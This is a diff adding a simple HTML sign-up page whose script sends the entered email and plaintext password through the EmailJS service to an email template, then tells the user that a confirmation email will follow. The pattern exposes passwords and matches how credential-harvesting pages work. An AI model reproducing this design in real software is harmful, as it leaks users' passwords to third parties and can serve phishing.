@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up - Information Technology</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo-container">
+      <img src="img1.png" alt="Information Technology" class="logo">
+    </div>
+    
+    <div class="text-container">
+        <p class="welcome-text" style="color: #333333; font-size: 40px; font-weight: bold; font-style: italic; text-align: center;">
+            <i><b><n> Welcome to our project </n></b></i>
+        </p>
+
+        <!-- Sign Up Form -->
+        <form id="signup-form">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="sign-in-btn">Sign Up</button>
+        </form>
+        
+        <!-- Links for Forgot Password and Sign Up -->
+        <div class="links">
+            <a href="forgot-password.html">Forgot password?</a>
+            <a href="signup.html">Sign Up</a>
+        </div>
+    </div>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  
+  <script>
+      // Initialize EmailJS with your user ID
+      emailjs.init('YV95iUQssFkJN3KDU'); // Replace with your user ID from EmailJS
+
+      // Handle form submission
+      document.getElementById('signup-form').addEventListener('submit', function(event) {
+          event.preventDefault(); // Prevent the form from submitting normally
+
+          // Get values from the form
+          const email = document.getElementById('email').value;
+          const password = document.getElementById('password').value;
+
+          // Prepare data to send to your email template
+          const templateParams = {
+              email: email,       // User's email
+              password: password  // User's password
+          };
+
+          // Send email using EmailJS
+          emailjs.send('service_default', 'template_nowiba', templateParams)
+              .then(function(response) {
+                  console.log('Success:', response);
+                  alert('Sign-up successful! A confirmation email will be sent.');
+                  // Optionally redirect after sending the email
+                  // window.location.href = 'main-page.html'; // Redirect to the main page
+              }, function(error) {
+                  console.log('Error:', error);
+                  alert('There was an error with the sign-up process. Please try again.');
+              });
+      });
+  </script>
+
+</body>
+</html>
